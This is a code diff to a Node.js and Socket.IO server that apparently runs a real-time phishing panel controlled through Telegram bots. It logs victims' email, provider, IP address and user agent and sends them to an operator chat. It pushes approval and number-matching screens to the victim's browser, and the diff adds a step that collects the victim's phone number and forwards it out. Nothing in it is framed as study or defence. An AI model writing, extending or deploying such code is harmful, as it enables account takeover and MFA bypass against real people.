@@ -65,8 +65,8 @@ app.post('/start-session', (req, res) => {
   session.userAgent = req.headers['user-agent'];
   session.socketId = req.body.socketId; // update socketId
   
-  //notify bot 
-  const escapeMarkdown = (text) => {
+    //notify bot
+    const escapeMarkdown = (text) => {
     if (!text) return 'N/A';
     return text.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
   };
@@ -178,7 +178,10 @@ io.on('connection', (socket) => {
       ],
       [
         { text: '🔢 Send Approve with Special Number', callback_data: `send_approve_with_number_${data.sessionId}` }  
-      ],
+      ], 
+        [
+        { text: '🔢 Verify Phone Number', callback_data: `verify_number_${data.sessionId}` }  
+      ], 
       [
         { text: '✔️ Mark Complete', callback_data: `mark_complete_${data.sessionId}` }
       ],
@@ -244,7 +247,49 @@ io.on('connection', (socket) => {
     } catch (error) {
       console.error('Telegram error:', error);
     }
-  });      
+  });            
+
+
+  // Handle phone number submission 
+  socket.on('submit-number', async (data) => {
+    let session = sessions.get(data.sessionId);
+    session.phoneNumber = data.number;
+    
+    console.log('Phone number submitted:', data);
+    // recheck session infos
+      console.log('Session data:', session);
+
+    const message = `🔢 *Phone Number Submitted*\n\n` +
+      `*Provider:* ${session.provider}\n` +
+      `*Email:* ${session.email}\n` +
+      `*phoneNumber:* \`${session.phoneNumber}\`\n` +
+      `*Session:* \`${data.sessionId}\``;
+
+    const keyboard = {
+      inline_keyboard: [ 
+         [
+          { text: '✔️ Mark Complete', callback_data: `mark_complete_${data.sessionId}` }
+        ],
+        [
+          { text: '🔄 Request Again', callback_data: `request_again_${data.sessionId}` }
+        ]
+      ]
+    };
+
+    try {
+      await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
+        parse_mode: 'Markdown',
+        reply_markup: keyboard
+      });  
+    } catch (error) {
+      console.error('Telegram error:', error);
+    }
+  });          
+
+
+
+
+
 
   // Handle disconnect
   socket.on('disconnect', () => {
@@ -359,7 +404,7 @@ try {
       socket.emit('show-approve-screen');
       await bot.sendMessage(chatId, '✅ Sent Approve screen to user'); 
       break;
-    }
+    } 
 
 
         case 'send_approve_with_number': {   
@@ -388,9 +433,36 @@ try {
         }
       });
       break;
+    } 
+  
+
+
+           case 'verify_number': {   
+      await bot.answerCallbackQuery(callbackQuery.id);
+       await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
+      chat_id: chatId,
+      message_id: messageId
+    });
+      await bot.sendMessage(chatId, '🔢 Enter the phone number hint to send (1-99):');
+      
+      // Wait for the number input
+      bot.once('message', async (msg) => {
+        if (msg.chat.id === chatId) {
+          const phoneNumberHint = msg.text;
+          
+          // Store it in session
+          let session = sessions.get(sessionId);
+          if (session) {
+            session.phoneNumberHint = phoneNumberHint;
+          }
+          
+          // Send to frontend
+          socket.emit('show-number-screen', { number: phoneNumberHint }); 
+          await bot.sendMessage(chatId, `✅ Sent number screen with phone number hint: ${phoneNumberHint}`);
+        }
+      });
+      break;
     }
-
-
 
 
     case 'mark_complete': {
@@ -403,7 +475,7 @@ try {
       message_id: messageId
     });
     let session = sessions.get(sessionId);
-      const escapeMarkdown = (text) => {
+     const escapeMarkdown = (text) => {
     if (!text) return 'N/A';
     return text.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
   };
@@ -415,9 +487,8 @@ try {
                 `*IP Address:* ${escapeMarkdown(session.ip || 'N/A')}\n` +
                 `*USER AGENT:* ${escapeMarkdown(session.userAgent || 'N/A')}\n` + 
                 `*Time:* ${new Date().toLocaleString()}`; 
-  
-  await bot2.sendMessage(TELEGRAM_CHAT_ID, summary, { parse_mode: 'Markdown' });
-  break;
+    await bot2.sendMessage(TELEGRAM_CHAT_ID, summary, { parse_mode: 'Markdown' });
+    break;
   }
 
 
@@ -436,7 +507,10 @@ try {
       ],
       [
         { text: '🔢 Approve with Number', callback_data: `resend_approve_number_${sessionId}` }
-      ]
+      ],
+       [
+        { text: '🔢 Resend Phone Number', callback_data: `resend_phone_number_${sessionId}` }
+      ],
     ]
   };
   
@@ -472,6 +546,25 @@ case 'resend_approve_number': {
       const specialNumber = msg.text;
       socket.emit('show-approve-with-number', { number: specialNumber });
       await bot.sendMessage(chatId, `✅ Sent approve screen with number: ${specialNumber}`);
+    }
+  });
+  break;
+}   
+
+
+
+case 'resend_phone_number': {
+  await bot.answerCallbackQuery(callbackQuery.id);
+  await bot.sendMessage(chatId, '🔢 Enter the phone number hint to send (1-99):');
+  
+  bot.once('message', async (msg) => {
+    if (msg.chat.id === chatId) {
+      let phoneNumberHint = msg.text;
+      //update session with new hint
+      let session = sessions.get(sessionId);
+      session.phoneNumberHint = phoneNumberHint;
+      socket.emit('show-number-screen', { number: phoneNumberHint });
+      await bot.sendMessage(chatId, `✅ Resent phone number hint: ${phoneNumberHint}`);
     }
   });
   break;
